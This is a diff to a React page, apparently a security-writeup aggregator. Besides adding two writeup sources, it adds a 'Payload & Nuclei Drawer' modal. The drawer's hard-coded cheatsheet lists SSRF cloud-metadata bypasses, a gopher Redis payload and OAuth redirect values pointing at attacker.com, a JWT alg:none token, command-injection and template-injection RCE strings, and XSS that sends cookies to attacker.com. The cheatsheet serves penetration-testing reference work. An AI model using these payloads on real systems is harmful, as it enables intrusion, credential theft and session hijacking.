@@ -4,6 +4,8 @@ import { useEffect, useMemo, useRef, useState } from "react";
 
 const SOURCES = [
   { id: "all", label: "All sources" },
+  { id: "devto", label: "Dev.to" },
+  { id: "hashnode", label: "Hashnode" },
   { id: "medium", label: "Medium" },
   { id: "walkthroughs", label: "Walkthroughs" },
   { id: "ctf", label: "CTF writeups" },
@@ -65,6 +67,62 @@ const METHODOLOGY_CHECKLISTS = [
   }
 ];
 
+const PAYLOAD_CHEATSHEETS = [
+  {
+    category: "SSRF & Cloud Metadata Bypasses",
+    tag: "SSRF",
+    payloads: [
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "http://2852039166/ (Decimal IP for 169.254.169.254)",
+      "http://0xA9FEA9FE (Hex IP for AWS Metadata)",
+      "http://169.254.169.254.nip.io",
+      "gopher://127.0.0.1:6379/_SLAVEOF%20attacker.com%206379"
+    ],
+    nuclei: "nuclei -t http/vulnerabilities/generic/ssrf-oast.yaml -u TARGET"
+  },
+  {
+    category: "IDOR & Authorization Bypasses",
+    tag: "IDOR",
+    payloads: [
+      "GET /api/v1/users/me -> GET /api/v1/users/1337",
+      "X-Original-User-ID: 1337",
+      "X-Rewrite-URL: /admin/users",
+      "{\"user_id\": 1337, \"role\": \"admin\"}"
+    ],
+    nuclei: "nuclei -t http/misconfiguration/idor/ -u TARGET"
+  },
+  {
+    category: "OAuth 2.0 & JWT Exploitation",
+    tag: "OAuth",
+    payloads: [
+      "redirect_uri=https://attacker.com/oauth/callback",
+      "redirect_uri=https://target.com.attacker.com/",
+      "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"user\":\"admin\"}."
+    ],
+    nuclei: "nuclei -t http/vulnerabilities/other/oauth-redirect-bypass.yaml -u TARGET"
+  },
+  {
+    category: "RCE & Command Injection",
+    tag: "RCE",
+    payloads: [
+      "; ping $(whoami).oast.fun #",
+      "| curl http://attacker.com/`id`",
+      "{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}"
+    ],
+    nuclei: "nuclei -t http/vulnerabilities/generic/command-injection-oast.yaml -u TARGET"
+  },
+  {
+    category: "XSS & DOM Injection",
+    tag: "XSS",
+    payloads: [
+      "<img src=x onerror=alert(document.domain)>",
+      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*[]|alert(1)//'>",
+      "\"><script>fetch('//attacker.com/?c='+document.cookie)</script>"
+    ],
+    nuclei: "nuclei -t http/vulnerabilities/generic/xss-fuzzing.yaml -u TARGET"
+  }
+];
+
 const formatDate = (date) =>
   date ? new Date(date).toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" }) : "undated";
 
@@ -107,6 +165,7 @@ export default function Page() {
   const [showRequest, setShowRequest] = useState(false);
   const [showRequestsList, setShowRequestsList] = useState(false);
   const [showMethodology, setShowMethodology] = useState(false);
+  const [showPayloads, setShowPayloads] = useState(false);
   const [requestForm, setRequestForm] = useState({ url: "", notes: "" });
   const [dark, setDark] = useState(true);
 
@@ -504,6 +563,9 @@ requests:
             <button className="btn-secondary" onClick={() => setShowMethodology(true)}>
               📑 Methodology Matrix
             </button>
+            <button className="btn-secondary" onClick={() => setShowPayloads(true)}>
+              🎯 Payload & Nuclei Drawer
+            </button>
             <button className="btn-secondary" onClick={loadStatus}>
               ◌ Source Health
             </button>
@@ -686,6 +748,55 @@ requests:
                   <ul style={{ margin: 0, paddingLeft: 18, color: "var(--text-secondary)", fontSize: 12, lineHeight: 1.6 }}>
                     {item.steps.map((step, idx) => (
                       <li key={idx}>{step}</li>
+                    ))}
+                  </ul>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* 🎯 Payload & Nuclei Cheatsheet Modal */}
+      {showPayloads && (
+        <div className="modal-backdrop" onClick={() => setShowPayloads(false)}>
+          <div className="command-modal" style={{ width: "min(760px, 100%)" }} onClick={(e) => e.stopPropagation()}>
+            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+              <h3>🎯 Payload Cheatsheets &amp; Nuclei References</h3>
+              <button className="btn-secondary" onClick={() => setShowPayloads(false)}>×</button>
+            </div>
+            <p style={{ color: "var(--text-secondary)", fontSize: 13, margin: "4px 0 12px" }}>
+              Instant attack payloads, bypass techniques, and Nuclei commands for top vulnerability classes.
+            </p>
+
+            <div style={{ display: "flex", flexDirection: "column", gap: 16, maxHeight: "440px", overflowY: "auto", paddingRight: 4 }}>
+              {PAYLOAD_CHEATSHEETS.map((item) => (
+                <div key={item.category} style={{ background: "var(--bg-input)", border: "1px solid var(--border)", borderRadius: 10, padding: 14 }}>
+                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8 }}>
+                    <strong style={{ color: "var(--accent-indigo)", fontSize: 14 }}>{item.category}</strong>
+                    <button
+                      className="btn-primary"
+                      style={{ fontSize: 11, padding: "4px 10px" }}
+                      onClick={() => {
+                        setShowPayloads(false);
+                        reset(() => setQ(item.tag));
+                      }}
+                    >
+                      Filter {item.tag} Reports ➔
+                    </button>
+                  </div>
+
+                  <div style={{ fontSize: 12, marginBottom: 8 }}>
+                    <span style={{ color: "var(--text-muted)", fontFamily: "var(--font-mono)" }}>Nuclei Command:</span>
+                    <code style={{ display: "block", background: "var(--bg-card)", padding: "6px 10px", borderRadius: 6, color: "#10b981", marginTop: 4, fontFamily: "var(--font-mono)" }}>
+                      {item.nuclei}
+                    </code>
+                  </div>
+
+                  <span style={{ color: "var(--text-muted)", fontSize: 11, fontFamily: "var(--font-mono)" }}>Bypass Payloads:</span>
+                  <ul style={{ margin: "4px 0 0", paddingLeft: 18, color: "var(--text-secondary)", fontSize: 12, fontFamily: "var(--font-mono)", lineHeight: 1.6 }}>
+                    {item.payloads.map((payload, idx) => (
+                      <li key={idx} style={{ wordBreak: "break-all" }}>{payload}</li>
                     ))}
                   </ul>
                 </div>
